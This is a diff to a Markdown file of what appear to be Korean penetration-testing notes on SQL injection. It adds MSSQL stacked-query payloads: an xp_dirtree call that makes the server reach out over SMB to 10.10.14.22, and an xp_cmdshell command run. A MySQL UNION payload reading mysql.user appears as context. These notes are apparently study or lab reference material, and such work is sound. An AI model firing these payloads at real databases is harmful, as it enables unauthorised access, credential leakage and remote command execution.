@@ -140,6 +140,13 @@ FILE 권한을 가진 경우 시스템 파일을 읽거나 쓸 수 있습니다.
 0 UNION select user,2,3 from mysql.user where user like 'r%'-- -
 ```
 
+### MSSQL
+```mssql
+500';EXEC xp_dirtree '\\10.10.14.22\test';-- -
+
+500';EXECUTE xp_cmdshell 'ping 10.10.14.22';-- -
+```
+
 </details>
 
 ---
